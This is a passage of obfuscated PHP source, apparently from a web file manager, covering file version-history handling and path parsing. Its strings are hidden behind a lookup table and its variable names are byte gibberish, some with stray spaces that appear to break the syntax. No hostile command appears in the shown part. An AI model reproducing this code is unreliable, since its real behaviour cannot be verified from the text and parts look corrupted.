$æ‡½¬ö½, $Çé£üîÉ); } } else { IO::move($‰³×Ü¯æ[$ä®ìÙ[88]], $Çé£üîÉ, !1, $æ‡½¬ö½); self::clearEmptyFolder(IO::pathFather($‰³×Ü¯æ[$ä®ìÙ[88]])); } } public static function eventAfterRemove($£Û„á™ä, $öèµ±ô‰) { $Û¬‹şÙ =& $_SERVER[¹àö™Ç¾]; if (!$öèµ±ô‰) { return; } $ªÂş³ßÜ = self::parsePath($£Û„á™ä[0]); if (!$ªÂş³ßÜ) { return; } $ºÓ’¤¡× = self::checkInHistory($ªÂş³ßÜ); if (!$ºÓ’¤¡×) { return; } if ($ºÓ’¤¡×[$Û¬‹şÙ[43]] == $Û¬‹şÙ[202]) { $—ºßÑ© = self::listData($ªÂş³ßÜ, !1); if ($—ºßÑ© && $—ºßÑ©[$Û¬‹şÙ[373]]) { self::clear($ªÂş³ßÜ, !1); } } else { IO::remove($ºÓ’¤¡×[$Û¬‹şÙ[88]]); self::clearEmptyFolder(IO::pathFather($ºÓ’¤¡×[$Û¬‹şÙ[88]])); } } private static function checkInHistory($êşíå’ğ) { $åÂ³¾ô© = self::pathHistory($êşíå’ğ); if (!IO::exist($åÂ³¾ô©)) { $åÂ³¾ô© .= $_SERVER[¹àö™Ç¾][1206]; } return IO::exist($åÂ³¾ô©) ? IO::info($åÂ³¾ô©) : !1; } private static function parsePath($²¡ß˜ÀÚ) { $ßæ· =& $_SERVER[¹àö™Ç¾]; if (!$²¡ß˜ÀÚ) { return !1; } if ($GLOBALS[$ßæ·[1207]]) { return; } $¾“ë§ß = KodIO::parse($²¡ß˜ÀÚ); $ôïŞŸ¶Ó = $¾“ë§ß[$ßæ·[43]]; $‡ó«¬øİ = !$ôïŞŸ¶Ó || $ôïŞŸ¶Ó == KodIO::KOD_IO || $ôïŞŸ¶Ó == KodIO::KOD_SHARE_ITEM; if (!$‡ó«¬øİ || !$¾“ë§ß[$ßæ·[1208]]) { return !1; } if (substr($²¡ß˜ÀÚ, 0, strlen(DATA_PATH . $ßæ·[1209])) == DATA_PATH . $ßæ·[1209]) { return !1; } if ($ôïŞŸ¶Ó == KodIO::KOD_SHARE_ITEM) { $Ó¥· · = IO::init($²¡ß˜ÀÚ); if ($Ó¥· ·->pathParse[$ßæ·[1136]]) { return self::parsePath($Ó¥· ·->pathParse[$ßæ·[1136]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¦ôØÓÏò = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ßæ·[1210]); foreach ($¦ôØÓÏò as $ºÒî›×Ù) { if (!$ôïŞŸ¶Ó && substr($²¡ß˜ÀÚ, 0, strlen($ºÒî›×Ù)) == $ºÒî›×Ù) { return !1; } } self::log($GLOBALS[$ßæ·[1131]] . $ßæ·[1211] . $²¡ß˜ÀÚ); return $²¡ß˜ÀÚ; } private static function pathHistory($õÈß•‚) { $Ÿ¥”„İ· =& $_SERVER[¹àö™Ç¾]; $Ú›¡ˆ°ğ = self::$_historyBase . ltrim(KodIO::clear($õÈß•‚), $Ÿ¥”„İ·[18]); $Ú›¡ˆ°ğ = str_replace(array($Ÿ¥”„İ·[1212]), array($Ÿ¥”„İ·[1213]), $Ú›¡ˆ°ğ); return $Ú›¡ˆ°ğ; } public static function log($¯óããÛ) { } public static function historyCount($­úÜ¤ö¢) { $”±Í†ğÇ =& $_SERVER[¹àö™Ç¾]; $‡·ºâé = array(); $å‰Ş²ïÊ = array(); foreach ($­úÜ¤ö¢ as $Á˜Ì™³¥) { $¾¨Ë¨Æ = get_path_father($Á˜Ì™³¥); if (!$å‰Ş²ïÊ[$¾¨Ë¨Æ]) { $å‰Ş²ïÊ[$¾¨Ë¨Æ] = array(); } $å‰Ş²ïÊ[$¾¨Ë¨Æ][] = get_path_this($Á˜Ì™³¥); } foreach ($å‰Ş²ïÊ as $¾¨Ë¨Æ => $…‡ÖãÉ) { $‘Ç‹¹–Ê = self::parsePath($¾¨Ë¨Æ); if (!$‘Ç‹¹–Ê) { continue; } foreach ($…‡ÖãÉ as $Í‡ı©§É) { $ÎÕšˆÏ¥ = self::listData(rtrim($‘Ç‹¹–Ê, $”±Í†ğÇ[18]) . $”±Í†ğÇ[18] . $Í‡ı©§É, !1); if ($ÎÕšˆÏ¥ && $ÎÕšˆÏ¥[$”±Í†ğÇ[373]]) { $‡·ºâé[rtrim($¾¨Ë¨Æ, $”±Í†ğÇ[18]) . $”±Í†ğÇ[18] . $Í‡ı©§É] = count($ÎÕšˆÏ¥[$”±Í†ğÇ[373]]); } } } return $‡·ºâé; } public static function add($Ñš†şõæ) { $ùâíÒàé =& $_SERVER[¹àö™Ç¾]; $µºÒ¿ä± = self::listData($Ñš†şõæ); if (!$µºÒ¿ä±) { return; } $•«£ÛŸ = Model($ùâíÒàé[762])->get($ùâíÒàé[1214]); $‘Ö¶ŠÜ = $GLOBALS[$ùâíÒàé[16]][$ùâíÒàé[100]][$ùâíÒàé[1192]]; $ÈÏ‹¾ĞÍ = $•«£ÛŸ == $ùâíÒàé[1215] ? 5 : $‘Ö¶ŠÜ; if ($‘Ö¶ŠÜ <= 0) { return; } $Ò¤¿„±Ş = IO::hashSimple($Ñš†şõæ); $ç—ù¤òŒ = IO::info($Ñš†şõæ); $•Ô‘™ı¼ = $µºÒ¿ä±[$ùâíÒàé[373]]; if ($ç—ù¤òŒ[$ùâíÒàé[90]] == 0) { return; } if ($ç—ù¤òŒ[$ùâíÒàé[90]] >= 1024 * 1024 * 500) { return !1; } if ($•Ô‘™ı¼ && $•Ô‘™ı¼[0][$ùâíÒàé[180]] == $Ò¤¿„±Ş) { return !0; } if (array_key_exists($ùâíÒàé[205], $ç—ù¤òŒ) && !$ç—ù¤òŒ[$ùâíÒàé[205]]) { return !1; } $ß´›€™ = short_id(time()); $¯şäñŒ¸ = array($ùâíÒàé[401] => $ß´›€™, $ùâíÒàé[180] => $Ò¤¿„±Ş, $ùâíÒàé[42] => $ç—ù¤òŒ[$ùâíÒàé[42]] . $ùâíÒàé[20] . date($ùâíÒàé[1216]) . rand_string(1), $ùâíÒàé[90] => $ç—ù¤òŒ[$ùâíÒàé[90]], $ùâíÒàé[452] => USER_ID, $ùâíÒàé[203] => time(), $ùâíÒàé[1217] => $ùâíÒàé[22]); IO::mkdir($µºÒ¿ä±[$ùâíÒàé[1218]]); $ÙÀ©áé± = IO::copy($Ñš†şõæ, $µºÒ¿ä±[$ùâíÒàé[1218]], !1, $¯şäñŒ¸[$ùâíÒàé[42]]); if (!$ÙÀ©áé±) { self::clearEmptyFolder($µºÒ¿ä±[$ùâíÒàé[1218]]); return !1; } array_unshift($•Ô‘™ı¼, $¯şäñŒ¸); if (count($•Ô‘™ı¼) > $ÈÏ‹¾ĞÍ) { $¢—”éĞ‘ = array_slice($•Ô‘™ı¼, $ÈÏ‹¾ĞÍ); foreach ($¢—”éĞ‘ as $ÛµãØ–Ù) { IO::remove($µºÒ¿ä±[$ùâíÒàé[1218]] . $ÛµãØ–Ù[$ùâíÒàé[42]]); } $•Ô‘™ı¼ = array_slice($•Ô‘™ı¼, 0, $ÈÏ‹¾ĞÍ); } return self::saveData($µºÒ¿ä±[$ùâíÒàé[1219]], $•Ô‘™ı¼); } public static function remove($ãÕ¿¬Ø, $·æ°ò¼) { $ÛÃ—…× =& $_SERVER[¹àö™Ç¾]; $ùßĞİã½ = self::listData($ãÕ¿¬Ø); $®§½’µÍ = array(); if (!$ùßĞİã½) { return !1; } foreach ($ùßĞİã½[$ÛÃ—…×[373]] as $ƒ´¨ôòÆ) { if ($ƒ´¨ôòÆ[$ÛÃ—…×[401]] == $·æ°ò¼) { IO::remove($ùßĞİã½[$ÛÃ—…×[1218]] . $ƒ´¨ôòÆ[$ÛÃ—…×[42]]); continue; } $®§½’µÍ[] = $ƒ´¨ôòÆ; } return self::saveData($ùßĞİã½[$ÛÃ—…×[1219]], $®§½’µÍ); } public static function clear($Ù‰¬Ü±—, $šÈö×‚½ = true) { $ˆì±£Æ =& $_SERVER[¹àö™Ç¾]; $ÖëÚ„Ïç = self::listData($Ù‰¬Ü±—, $šÈö×‚½); if (!$ÖëÚ„Ïç) { return !1; } foreach ($ÖëÚ„Ïç[$ˆì±£Æ[373]] as $”¤ŞÕÛ½) { IO::remove($ÖëÚ„Ïç[$ˆì±£Æ[1218]] . $”¤ŞÕÛ½[$ˆì±£Æ[42]]); } return self::saveData($ÖëÚ„Ïç[$ˆì±£Æ[1219]], array()); } public static function moveHistory($•£É¤÷Ç, $š“Û£®® = '', $ˆÉ› ş¤ = '') { $×Õ°¢€¨ =& $_SERVER[¹àö™Ç¾]; $“–Ø§¾ = self::listData($•£É¤÷Ç, !1); if (!$“–Ø§¾ || !$“–Ø§¾[$×Õ°¢€¨[373]]) { return !1; } $Ã¥ºÊ¸É = $×Õ°¢€¨[1206]; $š“Û£®® = $š“Û£®® ? $š“Û£®® : get_path_this($•£É¤÷Ç); $ˆÉ› ş¤ = $ˆÉ› ş¤ ? $ˆÉ› ş¤ : $“–Ø§¾[$×Õ°¢€¨[1218]]; $‚®ÀÌú = substr(get_path_this($“–Ø§¾[$×Õ°¢€¨[1219]]), 0, -strlen($Ã¥ºÊ¸É)); foreach ($“–Ø§¾[$×Õ°¢€¨[373]] as $ìòÌè“Ë => $«Úà¤µÑ) { $¢ÍÚË¥œ = $š“Û£®® . substr($«Úà¤µÑ[$×Õ°¢€¨[42]], strlen($‚®ÀÌú)); $–ÁÜ÷›æ = IO::move($“–Ø§¾[$×Õ°¢€¨[1218]] . $«Úà¤µÑ[$×Õ°¢€¨[42]], $ˆÉ› ş¤, !1, $¢ÍÚË¥œ); if ($–ÁÜ÷›æ) { $“–Ø§¾[$×Õ°¢€¨[373]][$ìòÌè“Ë][$×Õ°¢€¨[42]] = $¢ÍÚË¥œ; } } $“–Ø§¾[$×Õ°¢€¨[1219]] = IO::move($“–Ø§¾[$×Õ°¢€¨[1219]], $ˆÉ› ş¤, !1, $š“Û£®® . $Ã¥ºÊ¸É); self::saveData($“–Ø§¾[$×Õ°¢€¨[1219]], $“–Ø§¾[$×Õ°¢€¨[373]]); self::clearEmptyFolder($“–Ø§¾[$×Õ°¢€¨[1218]]); } public static function rollback($Ó–¦ü¶¿, $õÚ˜èÍí) { $Éœ• =& $_SERVER[¹àö™Ç¾]; $ëì’°·ù = self::listData($Ó–¦ü¶¿); if (!$ëì’°·ù) { return; } $«êä»ıì = IO::info($Ó–¦ü¶¿); foreach ($ëì’°·ù[$Éœ•[373]] as $‚Ùâ»Ô => $¾‹êäó•) { if ($¾‹êäó•[$Éœ•[401]] == $õÚ˜èÍí) { self::add($Ó–¦ü¶¿); $¡÷õı™ = $ëì’°·ù[$Éœ•[1218]] . $¾‹êäó•[$Éœ•[42]]; $Ö·Ö§æà = IO::copy($¡÷õı™, IO::pathFather($Ó–¦ü¶¿), REPEAT_REPLACE, $«êä»ıì[$Éœ•[42]]); if ($Ö·Ö§æà) { self::remove($Ó–¦ü¶¿, $õÚ˜èÍí); } return $Ö·Ö§æà; } } return !1; } public static function setDetail($Óò˜Ééû, $ŒéÕ¸ç, $ÉÚÚšóê) { $ªòµÁ¶— =& $_SERVER[¹àö™Ç¾]; $ÅıæÂ¹‡ = self::listData($Óò˜Ééû); if (!$ÅıæÂ¹‡) { return; } foreach ($ÅıæÂ¹‡[$ªòµÁ¶—[373]] as $Û±±èÛ… => $¶¸µ¼Œ¿) { if ($¶¸µ¼Œ¿[$ªòµÁ¶—[401]] == $ŒéÕ¸ç) { $ÅıæÂ¹‡[$ªòµÁ¶—[373]][$Û±±èÛ…][$ªòµÁ¶—[1217]] = $ÉÚÚšóê; self::saveData($ÅıæÂ¹‡[$ªòµÁ¶—[1219]], $ÅıæÂ¹‡[$ªòµÁ¶—[373]]); return !0; } } return !1; } public static function fileInfo($¼í¶Ñ¢, $ˆşğÔİó) { $ ØõÜó =& $_SERVER[¹àö™Ç¾]; $ÓÛ°¯ï£ = self::listData($¼í¶Ñ¢); if (!$ÓÛ°¯ï£) { show_json(LNG($ ØõÜó[116]), !1); } $æÅ£ †Â = $ ØõÜó[22]; foreach ($ÓÛ°¯ï£[$ ØõÜó[373]] as $¼±ãÖÚ§ => $Õ½ŞĞ) { if ($Õ½ŞĞ[$ ØõÜó[401]] != $ˆşğÔİó) { continue; } $æÅ£ †Â = $ÓÛ°¯ï£[$ ØõÜó[1218]] . $Õ½ŞĞ[$ ØõÜó[42]]; break; } if (!$æÅ£ †Â) { show_json(LNG($ ØõÜó[116]), !1); } return IO::info($æÅ£ †Â); } public static function fileOut($˜ğ¦İ‚, $´Èñ˜ğ, $Ïæüò¨™ = false) { $Şòô¨›å =& $_SERVER[¹àö™Ç¾]; $ÃôÊÅ—¯ = self::fileInfo($˜ğ¦İ‚, $´Èñ˜ğ); $ÇÛË¤ƒå =& $GLOBALS[$Şòô¨›å[17]]; $Ïæüò¨™ = isset($ÇÛË¤ƒå[$Şòô¨›å[1182]]) && $ÇÛË¤ƒå[$Şòô¨›å[1182]] == 1; if (isset($ÇÛË¤ƒå[$Şòô¨›å[43]]) && $ÇÛË¤ƒå[$Şòô¨›å[43]] == $Şòô¨›å[1220]) { return IO::fileOutImage($ÃôÊÅ—¯[$Şòô¨›å[88]], $ÇÛË¤ƒå[$Şòô¨›å[1221]]); } IO::fileOut($ÃôÊÅ—¯[$Şòô¨›å[88]], $Ïæüò¨™, get_path_this($˜ğ¦İ‚)); } public static function listData($€ù»Ó—¸, $ŸºÌÜ = true) { $òÔÃ¡ë =& $_SERVER[¹àö™Ç¾]; if ($ŸºÌÜ && !IO::exist($€ù»Ó—¸)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($€ù»Ó—¸, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÄúíèÌè = self::pathHistory($€ù»Ó—¸); $ŠëçÁ¿› = array($òÔÃ¡ë[1219] => $ÄúíèÌè . $òÔÃ¡ë[1206], $òÔÃ¡ë[1218] => rtrim(get_path_father($ÄúíèÌè), $òÔÃ¡ë[18]) . $òÔÃ¡ë[18], $òÔÃ¡ë[373] => array()); $â¥¦¼ø· = IO::getContent($ŠëçÁ¿›[$òÔÃ¡ë[1219]]); if ($â¥¦¼ø·) { $ÒÎöÏ£® = json_decode($â¥¦¼ø·, !0); if (is_array($ÒÎöÏ£®)) { $ŠëçÁ¿›[$òÔÃ¡ë[373]] = $ÒÎöÏ£®; } } return $ŠëçÁ¿›; } private static function saveData($Ìë­§Ë‰, $Ôƒ‰«¯¥) { $ÄÎ»…Îñ =& $_SERVER[¹àö™Ç¾]; self::log($ÄÎ»…Îñ[1222] . $Ìë­§Ë‰ . $ÄÎ»…Îñ[81] . count($Ôƒ‰«¯¥), $ÄÎ»…Îñ[744]); if ($Ôƒ‰«¯¥) { return IO::setContent($Ìë­§Ë‰, json_encode($Ôƒ‰«¯¥)); } $÷—ñ¢íØ = IO::pathFather($Ìë­§Ë‰); IO::remove($Ìë­§Ë‰); self::clearEmptyFolder($÷—ñ¢íØ); return !0; } public static function clearEmptyFolder($›ø¸×–ö) { $œï²æ” =& $_SERVER[¹àö™Ç¾]; if (trim($›ø¸×–ö, $œï²æ”[18]) == trim(self::$_historyBase, $œï²æ”[18])) { return; } $’¢·¯– = IO::pathFather($›ø¸×–ö); $ş‰êşßô = IO::has($›ø¸×–ö, !0); if ($ş‰êşßô[$œï²æ”[212]] > 0 || $ş‰êşßô[$œï²æ”[213]] > 0) { return; } IO::remove($›ø¸×–ö); self::clearEmptyFolder($’¢·¯–); } private static function getBasePath() { $æ¢õ¼›´ =& $_SERVER[¹àö™Ç¾]; $¦–Ç§ƒ = Model($æ¢õ¼›´[1223])->get($æ¢õ¼›´[1224]); if ($¦–Ç§ƒ) { if (!IO::exist($¦–Ç§ƒ)) { IO::mkdir($¦–Ç§ƒ); } if (get_path_this($¦–Ç§ƒ) == $æ¢õ¼›´[1209]) { $†ÄÀ³¥Ó = $æ¢õ¼›´[1225] . rand_string(8); @rename($¦–Ç§ƒ, get_path_father($¦–Ç§ƒ) . $æ¢õ¼›´[18] . $†ÄÀ³¥Ó); $¦–Ç§ƒ = DATA_PATH . $†ÄÀ³¥Ó . $æ¢õ¼›´[18]; file_put_contents(DATA_PATH . $æ¢õ¼›´[1226], $æ¢õ¼›´[22]); Model($æ¢õ¼›´[1223])->set($æ¢õ¼›´[1224], $¦–Ç§ƒ); } return $¦–Ç§ƒ; } $¦–Ç§ƒ = DATA_PATH . $æ¢õ¼›´[1225] . rand_string(8) . $æ¢õ¼›´[18]; $¦–Ç§ƒ = IO::mkdir($¦–Ç§ƒ); $¦–Ç§ƒ = rtrim($¦–Ç§ƒ, $æ¢õ¼›´[18]) . $æ¢õ¼›´[18]; file_put_contents($¦–Ç§ƒ . $æ¢õ¼›´[1226], $æ¢õ¼›´[22]); file_put_contents(DATA_PATH . $æ¢õ¼›´[1226], $æ¢õ¼›´[22]); Model($æ¢õ¼›´[1223])->set($æ¢õ¼›´[1224], $¦–Ç§ƒ); return $¦–Ç§ƒ; } } class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\x52\145\x63\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\173\165\163\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\162\x46\x69\154\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\162\x46\x69\x6c\145\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\x75\x70\122\x6f\x6f\x74\x53\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\173\165\163\145\x72\123\150\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\162\x53\150\x61\x72\x65\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\145\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\x68\141\x72\x65\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\141\162\145\111\x74\145\x6d\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\x73\145\141\x72\143\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\143\x6b\175"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\145\162\122\145\x6e\x63\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\x65\x72\175"; public static function typeList() { $²‚ãóô€ =& $_SERVER[¹àö™Ç¾]; return array($²‚ãóô€[1227] => self::KOD_SOURCE, $²‚ãóô€[1228] => self::KOD_USER_RECYCLE, $²‚ãóô€[1229] => self::KOD_USER_FAV, $²‚ãóô€[1230] => self::KOD_USER_FILE_TAG, $²‚ãóô€[1231] => self::KOD_USER_FILE_TYPE, $²‚ãóô€[1232] => self::KOD_GROUP_ROOT_SELF, $²‚ãóô€[1233] => self::KOD_USER_SHARE, $²‚ãóô€[1234] => self::KOD_USER_SHARE_LINK, $²‚ãóô€[1235] => self::KOD_USER_SHARE_TO_ME, $²‚ãóô€[1236] => self::KOD_SHARE_ITEM, $²‚ãóô€[1237] => self::KOD_SHARE_LINK, $²‚ãóô€[1238] => self::KOD_SEARCH, $²‚ãóô€[1239] => self::KOD_BLOCK, $²‚ãóô€[1240] => self::KOD_IO, $²‚ãóô€[1241] => self::KOD_USER_RECENT, $²‚ãóô€[1242] => self::KOD_USER_DRIVER); } public static function parse($­îñÍ“„) { $ÆÅƒÖãª =& $_SERVER[¹àö™Ç¾]; $­îñÍ“„ = self::clear($­îñÍ“„); $ÏŠ´•äÎ = array_values(self::typeList()); preg_match($ÆÅƒÖãª[1243], $­îñÍ“„, $îŸ³Õ); $¼˜—œêó = array($ÆÅƒÖãª[423] => !1, $ÆÅƒÖãª[1244] => !1, $ÆÅƒÖãª[420] => !1, $ÆÅƒÖãª[88] => $­îñÍ“„, $ÆÅƒÖãª[1153] => !1, $ÆÅƒÖãª[1152] => $ÆÅƒÖãª[22]); if (is_array($îŸ³Õ) && count($îŸ³Õ) == 5) { $Ğµ‡À¥¼ = $ÆÅƒÖãª[1245] . $îŸ³Õ[2] . $ÆÅƒÖãª[331]; if (in_array($Ğµ‡À¥¼, $ÏŠ´•äÎ)) { $¼˜—œêó[$ÆÅƒÖãª[1153]] = $îŸ³Õ[1]; $¼˜—œêó[$ÆÅƒÖãª[43]] = $Ğµ‡À¥¼; $¼˜—œêó[$ÆÅƒÖãª[1246]] = substr($Ğµ‡À¥¼, 1, -1); $¼˜—œêó[$ÆÅƒÖãª[401]] = $îŸ³Õ[3]; } $¼˜—œêó[$ÆÅƒÖãª[1152]] = $îŸ³Õ[4]; } $ÊÊË¼Á¡ = array($ÆÅƒÖãª[22], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¼˜—œêó[$ÆÅƒÖãª[1208]] = in_array($¼˜—œêó[$ÆÅƒÖãª[43]], $ÊÊË¼Á¡); return $¼˜—œêó; } public static function isTruePath($ÀÉœ¡«Æ) { $ÆÓ¶¿øÁ =& $_SERVER[¹àö™Ç¾]; if (substr($ÀÉœ¡«Æ, 0, 1) != $ÆÓ¶¿øÁ[1245]) { return !0; } if (strpos($ÀÉœ¡«Æ, $ÆÓ¶¿øÁ[409]) === 0) { return !0; } if (strpos($ÀÉœ¡«Æ, $ÆÓ¶¿øÁ[1212]) === 0) { return !0; } if (strpos($ÀÉœ¡«Æ, $ÆÓ¶¿øÁ[1247]) === 0) { return !0; } if (strpos($ÀÉœ¡«Æ, $ÆÓ¶¿øÁ[1248]) === 0) { return !0; } if (strpos($ÀÉœ¡«Æ, $ÆÓ¶¿øÁ[1249]) === 0) { return !0; } return !1; } public static function clear($°Ìå ò˜) { $ÍÈ‰„‰Œ =& $_SERVER[¹àö™Ç¾]; $°Ìå ò˜ = str_replace(array($ÍÈ‰„‰Œ[1063], $ÍÈ‰„‰Œ[11]), $ÍÈ‰„‰Œ[63], $°Ìå ò˜); $°Ìå ò˜ = str_replace($ÍÈ‰„‰Œ[108], $ÍÈ‰„‰Œ[18], $°Ìå ò˜); $îÚú¹û° = $ÍÈ‰„‰Œ[1250]; if (substr($°Ìå ò˜, 0, 3) == $ÍÈ‰„‰Œ[1251]) { $°Ìå ò˜ = substr($°Ìå ò˜, 3); } while (strstr($°Ìå ò˜, $îÚú¹û°)) { $°Ìå ò˜ = str_replace($îÚú¹û°, $ÍÈ‰„‰Œ[18], $°Ìå ò˜); } $°Ìå ò˜ = preg_replace($ÍÈ‰„‰Œ[1252], $ÍÈ‰„‰Œ[18], $°Ìå ò˜); if ($°Ìå ò˜ == $ÍÈ‰„‰Œ[18]) { return $ÍÈ‰„‰Œ[18]; } $°Ìå ò˜ = rtrim($°Ìå ò˜, $ÍÈ‰„‰Œ[18]); return $°Ìå ò˜; } public static function sourceID($ÎÀÃåÍõ) { $ÜÕšÜ¶… =& $_SERVER[¹àö™Ç¾]; $”î´ºÅ¡ = self::parse($ÎÀÃåÍõ); if ($”î´ºÅ¡[$ÜÕšÜ¶…[43]] !== self::KOD_SOURCE) { show_json(LNG($ÜÕšÜ¶…[1253]), !1); } return $”î´ºÅ¡[$ÜÕšÜ¶…[401]]; } public static function make($ÉÒâÉµö) { if (!$ÉÒâÉµö) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÉÒâÉµö)); } public static function makeShare($½ëÕü¬Í, $©ŸÕİğİ) { return self::makePath(self::KOD_SHARE_ITEM, $½ëÕü¬Í, $©ŸÕİğİ); } public static function makeFileTypePath($û°©‹¡ğ) { return self::makePath(self::KOD_USER_FILE_TYPE, $û°©‹¡ğ); } public static function makeFileTagPath($¡ÀùµÚ˜) { return self::makePath(self::KOD_USER_FILE_TAG, $¡ÀùµÚ˜); } public static function makePath($œŸÄçõ†, $Ôñ¸½Ñ = '', $ÇĞñ¿ºë = '') { $Ñºá¦Ÿõ =& $_SERVER[¹àö™Ç¾]; $Á¿„’‹ = substr($œŸÄçõ†, 1, -1); $ë•¡²µˆ = $Ñºá¦Ÿõ[1254] . $Á¿„’‹ . $Ñºá¦Ÿõ[1255] . $Ôñ¸½Ñ . $Ñºá¦Ÿõ[1256]; $ë•¡²µˆ = $ÇĞñ¿ºë ? $ë•¡²µˆ . $ÇĞñ¿ºë . $Ñºá¦Ÿõ[18] : $ë•¡²µˆ; return $ë•¡²µˆ; } public static function hashPath($¼ó•ñõ, $è›¿êÕÂ = true) { $à½İÑ˜ê =& $_SERVER[¹àö™Ç¾]; $‹¢µÏŒ‹ = is_array($¼ó•ñõ) ? $¼ó•ñõ : IO::info($¼ó•ñõ); $²ª¹ßÖ… = _get($‹¢µÏŒ‹, $à½İÑ˜ê[1257], $à½İÑ˜ê[22]); if (!$²ª¹ßÖ… && isset($‹¢µÏŒ‹[$à½İÑ˜ê[403]])) { $‹¢µÏŒ‹ = IO::info(KodIO::make($‹¢µÏŒ‹[$à½İÑ˜ê[403]])); $²ª¹ßÖ… = _get($‹¢µÏŒ‹, $à½İÑ˜ê[1257], $à½İÑ˜ê[22]); } if (!$²ª¹ßÖ… && $è›¿êÕÂ) { $îÆĞ½Œù = KodIO::parse($‹¢µÏŒ‹[$à½İÑ˜ê[88]]); if (!$îÆĞ½Œù[$à½İÑ˜ê[43]]) { $²ª¹ßÖ… = IO::hashSimple($‹¢µÏŒ‹[$à½İÑ˜ê[88]]); } } if (!$²ª¹ßÖ…) { $²ª¹ßÖ… = md5($‹¢µÏŒ‹[$à½İÑ˜ê[88]] . $‹¢µÏŒ‹[$à½İÑ˜ê[90]] . $‹¢µÏŒ‹[$à½İÑ˜ê[96]]); } return $²ª¹ßÖ…; } public static function initSystemPath() { $‚ ÂÔ³¶ =& $_SERVER[¹àö™Ç¾]; if (defined($‚ ÂÔ³¶[1258])) { return; } define($‚ ÂÔ³¶[1258], self::systemPath($‚ ÂÔ³¶[1259])); define($‚ ÂÔ³¶[1260], self::systemPath($‚ ÂÔ³¶[1261])); define($‚ ÂÔ³¶[1262], self::systemPath($‚ ÂÔ³¶[1263])); define($‚ ÂÔ³¶[1264], self::systemPath($‚ ÂÔ³¶[1265])); IOHistory::bindEvent(); } public static function systemPath($„ìıÚËã) { $Æá»Ò =& $_SERVER[¹àö™Ç¾]; $ã–ú„ïö = $Æá»Ò[1266] . ucfirst($„ìıÚËã); $´øéˆĞï = Model($Æá»Ò[762])->get($ã–ú„ïö); if ($´øéˆĞï) { return $´øéˆĞï; } if ($„ìıÚËã == $Æá»Ò[1259]) { $´øéˆĞï = self::make(Model($Æá»Ò[817])->systemRootPathAdd($Æá»Ò[537])); } else { $´øéˆĞï = self::systemPath($Æá»Ò[1259]); $“•¾à˜Õ = self::sourceID($´øéˆĞï); $´øéˆĞï = self::make(Model($Æá»Ò[817])->mkdir($“•¾à˜Õ, $„ìıÚËã)); } Model($Æá»Ò[762])->set($ã–ú„ïö, $´øéˆĞï); return $´øéˆĞï; } public static function systemFolder($×ñ¿í) { $¾îÁ™ïŠ = IO_PATH_SYSTEM_SOURCE . $×ñ¿í; $¸èşæğŒ = Cache::get($¾îÁ™ïŠ); if (!$¸èşæğŒ) { $û¨ãÀ¢À = IO::infoFull($¾îÁ™ïŠ); if (!$û¨ãÀ¢À) { $¸èşæğŒ = IO::mkdir($¾îÁ™ïŠ, REPEAT_SKIP); } else { $¸èşæğŒ = $û¨ãÀ¢À[$_SERVER[¹àö™Ç¾][88]]; } Cache::set($¾îÁ™ïŠ, $¸èşæğŒ, 3600 * 10); } return $¸èşæğŒ; } public static function defaultDriver() { return Model($_SERVER[¹àö™Ç¾][759])->defaultDriver(); } public static function defaultIO() { $ø†äœÒ‹ =& $_SERVER[¹àö™Ç¾]; $†ûê–šÄ = self::defaultDriver(); return $ø†äœÒ‹[1267] . $†ûê–šÄ[$ø†äœÒ‹[401]] . $ø†äœÒ‹[1256]; } public static function defaultDriverInit() { static $ä¤¾øÚ = false; if ($ä¤¾øÚ) { return $ä¤¾øÚ; } $ä¤¾øÚ = IO::init(self::defaultIO()); return $ä¤¾øÚ; } public static function fileTypeList() { $µ¿»‹ÎÇ =& $_SERVER[¹àö™Ç¾]; $±×¨à¦Ì = $GLOBALS[$µ¿»‹ÎÇ[16]][$µ¿»‹ÎÇ[1268]]; foreach ($±×¨à¦Ì as $ÁÚç‡à => $¬Ô¿âéé) { $ó„¯Šäî = $µ¿»‹ÎÇ[1269] . $ÁÚç‡à; $šÁÕöšÒ = LNG($ó„¯Šäî); if ($ó„¯Šäî != $šÁÕöšÒ) { $±×¨à¦Ì[$ÁÚç‡à][$µ¿»‹ÎÇ[42]] = $šÁÕöšÒ; } } return $±×¨à¦Ì; } public static function diskList($Â½°‡’Ó = true) { $øÜÌ³½€ = $_SERVER[¹àö™Ç¾][1270]; if ($Â½°‡’Ó) { $°Àú¿ä¦ = Cache::get($øÜÌ³½€); if (is_array($°Àú¿ä¦)) { return $°Àú¿ä¦; } } $°Àú¿ä¦ = self::diskListGet(); Cache::set($øÜÌ³½€, $°Àú¿ä¦, 60); return $°Àú¿ä¦; } public static function diskListGet() { $—§Å¡íí =& $_SERVER[¹àö™Ç¾]; $òç¸©˜„ = array(); if ($GLOBALS[$—§Å¡íí[16]][$—§Å¡íí[1271]] == $—§Å¡íí[1272]) { $Øç¿¶©¯ = $—§Å¡íí[1273]; for ($ÚÜØ¤Á‡ = 0; $ÚÜØ¤Á‡ < strlen($Øç¿¶©¯); $ÚÜØ¤Á‡++) { $‚Şû¢ = 